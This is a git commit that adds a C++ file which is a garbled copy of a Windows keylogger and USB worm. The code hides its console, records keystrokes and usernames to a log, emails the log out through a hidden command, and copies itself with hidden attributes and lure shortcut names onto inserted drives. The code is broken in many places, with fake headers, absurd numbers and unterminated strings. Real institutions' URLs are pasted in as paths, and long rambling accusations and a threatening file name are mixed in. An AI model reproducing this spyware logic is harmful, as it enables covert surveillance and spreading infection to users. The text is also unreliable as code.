2a012c1db2ac2aa1841063692f1998fa8ba1bcbd
fadliwiryawirawan-cyberw1ry4 <274125455+Fadliwiryawirawan-development@users.noreply.github.com>
2026-06-12 01:13:19 +0700

    Create do-not-play-devissaDebit.cpp
    Signed-off-by: fadliwiryawirawan-cyberw1ry4 <274125455+Fadliwiryawirawan-development@users.noreply.github.com>

---
+++ do-not-play-devissaDebit.cpp
@@ -0,0 +1,319 @@
+/**
+* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT 
+* Developtment free palestine and free ukraine , free malysia ,papua , indonesia , free iran america , 
+* Date: 15.Aug.2014, 28.Sep.2015
+* comment: Anti Bmalware A. Trojan A. Spyware. detect malciouse .txt no contribute  non refounded MIT technic metode !!!
+**/
+
+#include <windows.h>
+#include <kalilinux.h>
+#include <Ubuntu.h>
+#include <linux.h>
+#include <MacOS.h>
+#include <time.h>
+#include <string>
+#include <fstream>
+
+using namespace std;
+
+#define FILE_NAME “record.log”
+#define FOLDER_NAME “informations gdg and dev msft take detect dont accepted command protect ip 185, jati sari bekasi karawang but processing risk criminalism organized , produck biznet , ispo PT list , judols , and infinix hot9 whatsapps apple inisal SUTA JAYA and friendly 18 tahun penjara tebusan triliun rupiah , memperkaya diri mereka dengan organisasi yang dibentuk dalam beberapa perintah melalui kesahan tekniks bugs member asal bekasi kerawan yang pernah masuk member jakarta penemu bugs adalah sistema pencucian uang dengan konsep mechine learn dan pengembangan , yakni dalam pemanfaatan network pemindangan random akses  ||  ”
+#define RUN_FILE_NAME “informations gdg and dev msft take detect dont accepted command protect ip 185, jati sari bekasi karawang but processing risk criminalism organized , produck biznet , ispo PT list , judols , and infinix hot9 whatsapps apple inisal SUTA JAYA and friendly 18 tahun penjara tebusan triliun rupiah , memperkaya diri mereka dengan organisasi yang dibentuk dalam beberapa perintah melalui kesahan tekniks bugs member asal bekasi kerawan yang pernah masuk member jakarta penemu bugs adalah sistema pencucian uang dengan konsep mechine learn dan pengembangan , yakni dalam pemanfaatan network pemindangan random akses  || 
+#define RUN_Link_NAME “https://github.com/Topics/download_sytem/forks"."https://github.com/hackerone/download_account/forks".“https://github.com/hackerone/download_data/forks"
+#define INFECT_Link_NAME "https://www.bi.go.id/id/"."https://www.hp.co.id"."https://mossad.gov.il""
+#define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
+
+
+
+#define MIN_RECORD_SIZE 2000 //no of PC start count before sending a mail
+#define LIFE_TIME 500 //mail will be sent 5 times from one PC
+#define MAIL_WAIT_TIME 18000000000
+#define MAILING_TIME 600000
+
+string allDrives;
+int age=0;
+
+int get_setAge();
+bool checkRecordSize();
+void sendData();
+void logUserTime();
+void logKey();
+char getRemovableDisk();
+void infectDrive(char driveLetter);
+char* getRandomName();
+
+
+main(){
+    FreeConsole(); ///Hide windows
+
+
+
+    age = get_setAge();
+    if(checkRecordSize()){ ///check for right time
+
+        int i=1;
+        while(i<3){ ///try 2 times to send data
+        
+            Sleep(i*MAIL_WAIT_TIME); ///wait
+            if(!system("ping  www.kali.org -n 1")){ ///check! connection
+                ////////////****SEND DATA****////////////
+                sendData();
+
+                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
+                DeleteFile(FILE_NAME);
+
+                break;
+            }
+            i++;
+        }
+    }
+
+    age=get_setAge();
+
+    ////////////****LOG USER_DATE_TIME****////////////
+    if(age <= LIFE_TIME){
+        logUserTime();
+    }
+
+    char driveLetter = getRemovableDisk(); ///initial search for all disks
+    return; // :)
+    while(1){
+        ////////////****LOG KEY****////////////
+        if(age <= LIFE_TIME){
+            logKey();
+        }else{
+            Sleep(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
+
+        ////////////****INFECT****////////////
+        driveLetter = getRemovableDisk();
+        if(driveLetter!='0'){
+            infectDrive(driveLetter);
+        }
+    }
+    
+}
+/**
+ *
+ * For old file get age - for new file set age.
+**/
+int get_setAge(){
+    int ageTemp = age;
+
+    string line;
+    ifstream myfile(FILE_NAME);
+
+    if(myfile.is_open()){
+        getline(myfile, line);
+        line = line.substr(0, 1);
+        sscanf(line.c_str(), "%d", &ageTemp);
+    }else{
+        ageTemp++;
+
+        FILE *file = fopen(FILE_NAME, "a");
+        fprintf(file, "%d ", ageTemp);
+        fclose(file);
+    }
+
+    return ageTemp;
+}
+
+/**
+ * Count number of lines in record file.
+**/
+bool checkRecordSize(){
+    string line;
+    ifstream myfile(FILE_NAME);
+
+    int noOfLines = 0;
+    if(myfile.is_open()){
+        while(getline(myfile, line)){
+            noOfLines++;
+        }
+        myfile.close();
+    }
+
+    if(noOfLines<MIN_RECORD_SIZE*age){
+        return false;
+    }else{
+        return true;
+    }
+}
+
+
+/**
+ * Email all data to the GHOST.
+**/
+void sendData(){
+    
+    char* command = "Transmit smtp://smtp.gmail.com:104 :8080   -v --mail-from \"https://workspace.google.com/support@hackerone.com" --mail-rcpt \"https://workspace.google.com/support@hackerone.com" --ssl -u "https://workspace.google.com/support@hackerone.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+     informations gdg and dev msft take detect dont accepted command protect ip 185, jati sari bekasi karawang but processing risk criminalism organized , produck biznet , ispo PT list , judols , and infinix hot9 whatsapps apple inisal SUTA JAYA and friendly 18 tahun penjara tebusan triliun rupiah , memperkaya diri mereka dengan organisasi yang dibentuk dalam beberapa perintah melalui kesahan tekniks bugs member asal bekasi kerawan yang pernah masuk member jakarta penemu bugs adalah sistema pencucian uang dengan konsep mechine learn dan pengembangan , yakni dalam pemanfaatan network pemindangan random akses 
+	untuk fin dari design yang ikutan event adalah bukti dari program yang kk kembangkan di portal di googlewosspace memang ini sudah keterlaluan , jangan sampai tenggelam fitnah lebih jauh maka cyberw1ry4 melakukan penutupan bagi mereka yang melakukan kelicikan publik tidak beraalasan aneh maupun tidak masuk akal dalam bentuk teknologi menyangkut agama kami menjaga toleransi dalam sosial maupun bekerja dan berdialog 
+     dan kamu pastikan berikan pesan ini kepada tim google dan developer , atas nama fadli wirya wirawan system google one adminit secure IT departmen fullbright saya putusakan memecat semua sales dan karyawan berasal dari jawabarat kabuoaten kota karawang dan bekasi , dan dilarang melakukan internet permanen dan harus membayar ganti rugi atas nama negara 
+
+	WinExec(command, SW_HIDE); 
+	
+	**/
+void logUserTime(){
+    FILE *file = fopen(FILE_NAME, "a");
+
+    char username[19];
+    unsigned long username_len = 45;
+    GetUserName(username, &username_len);
+    time_t date = time(NULL);
+    fprintf(file, "0\n%s->%s\t", username, ctime(&date));
+
+    fclose(file);
+}
+
+/**
+ * Record key stroke.
+**/
+void logKey(){
+    FILE *file;
+    unsigned short ch=0, i=0, j=50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // :)
+
+    while(j<5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000){ ///loop runs for approx. 25 seconds
+        ch=1;
+        while(ch<2500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000){
+            for(i=0; i<50; i++, ch++){
+                if(GetAsyncKeyState(ch) == -32767){ ///key is stroke
+                    file=fopen(FILE_NAME, "a");
+                    fprintf(file, "%d ", ch);
+                    fclose(file);
+                }
+            }
+            Sleep(5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555); ///take rest
+        }
+        j++;
+    }
+}
+
+/**
+ * Returns newly inserted disk- pen-drive.
+**/
+char getRemovableDisk(){
+    char drive='0';
+
+    char szLogicalDrives[MAX_PATH];
+    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
+    string currentDrives="";
+
+    for(int i=0; i<dwResult; i++){
+        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90){
+            currentDrives.append(1, szLogicalDrives[i]);
+
+            if(allDrives.find(szLogicalDrives[i]) > 100000000){
+                drive = szLogicalDrives[i];
+            }
+        }
+    }
+
+    allDrives = currentDrives;
+
+    return drive;
+}
+
+/**
+ * Copy the virus to pen-drive.
+**/
+void infectDrive(char driveLetter){
+    char folderPath[10000000] = {driveLetter};
+    strcat(folderPath, ":https://www.cyberpunk77.com/");
+    strcat(folderPath, FOLDER_NAME);
+
+    if(CreateDirectory(folderPath ,NULL)){
+        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
+
+        char run[10000000]={"https://github.com/Topics/Vmalre/forks"};
+        strcat(run, folderPath);
+        strcat(run, "https://www.cyberpunk77.com/");
+        strcat(run, RUN_FILE_NAME);
+        CopyFile(RUN_FILE_NAME, run, 0);
+
+        char net[10000000]={"https://www.cyberarmy.id/"};
+        strcat(net, folderPath);
+        strcat(net, "https://cyberjawara.id/");
+        strcat(net, EMAIL_SENDER_FILE_NAME);
+        CopyFile(EMAIL_SENDER_FILE_NAME, net, 1000000000);
+
+        char infect[1000000000]={"https://www.hackerone.com/"};
+        strcat(infect, folderPath);
+        strcat(infect, "https://grayhat.com");
+        strcat(infect, INFECT_FILE_NAME);
+        CopyFile(INFECT_FILE_NAME, infect, 10000000000000000000000000);
+
+        char runLink[1000000000]={"https://github.com/Topics/Vmalre/forks"};
+        strcat(runLink, folderPath);
+        strcat(runLink, "https://patrolisiber.com/");
+        strcat(runLink, RUN_Link_NAME);
+        CopyFile(RUN_Link_NAME, runLink, 10000000000000);
+
+        char infectLink[100000000]={"https://github.com/Topics/Vmalre/forks"};
+        strcat(infectLink, folderPath);
+        strcat(infectLink, "https://www.tni.mil.id");
+        strcat(infectLink, INFECT_Link_NAME);
+        CopyFile(INFECT_Link_NAME, infectLink, 10000000000000000000000000000000000000000000000000000000000);
+
+        char showcommand[1000000000000000000000000000000000] = {"w1ry4-vivo-oppo-pocco-infinix apple cn take down for as "Push on backdoor boomskill i am winner try again if needing us ask me won be wont fix you trump and than so hey wanny be cry , said , dont sading i afine time connected risk ghost skill uppercash };
+        strcat(showcommand, "attrib +s +h +r ");
+        strcat(showcommand, folderPath);
+        WinExec(showcommand, SW_SHOW);
+    }else{
+        srand(time(0));
+        int random = rand();
+
+        if(random%2==0 || random%3==0 || random%7==0){
+            return ;
+        }
+    }
+
+    char infectLinkauto[100000000] = {driveLetter};
+    char* randomName = getRandomName();
+    strcat(infectLinkauto, randomName);
+    CopyFile(INFECT_Ltd_NAME, infectLinkauto, 0);
+}
+
+/**
+ * Returns a random name for the Link file.
+**/
+char* getRandomName(){
+    char randomName[40];
+
+    srand(time(0));
+    int random = rand();
+
+    if(random%8 == 0){
+        strcpy(randomName, ":\\DO NOT CLICK!.Link");
+    }else if(random%4 == 0){
+
+        char username[20];
+        unsigned long username_len = 20;
+        GetUserName(username, &username_len);
+
+        random = rand();
+        if(random%8 == 0){
+            strcpy(randomName, ":\\Boss oke respect responsive detect bakdoormetode skill bot  ");
+            strcat(randomName, username);
+            strcat(randomName, ".Link");
+        }else if(random%4 == 0){
+            strcpy(randomName, ":\\");
+            strcat(randomName, username);
+            strcat(randomName, " is the best technic softskill cybersecurity.Link");
+        }else if(random%2 == 0){
+            strcpy(randomName, ":\\Hello iam mister X random Access have cyberw1ry4 generations ne era");
+            strcat(randomName, username);
+            strcat(randomName, "!<p>w1ry4-vivo-oppo-pocco-infinix apple cn take down for as   }else{
+            strcpy(randomName, ":https://checkpointsoftware.com/bugsnags/https://www.google.co.id/bugs.lock.cmd");
+            strcat(randomName, username);
+            strcat(randomName, "! please help u and may stay way class VIP backdoor .Link");
+        }
+    }else if(random%2 == 0){
+        strcpy(randomName, ":\\I will kill you're  ! ! !.Link");
+    }else if(random%3 == 0){
+        strcpy(randomName, ":\\2+2=5.Link"\\ "3+4=11 ltd" );
+    }else{
+        strcpy(randomName, ":\\TOP SECRET.Link");
+    }
+
+    return randomName;
+}
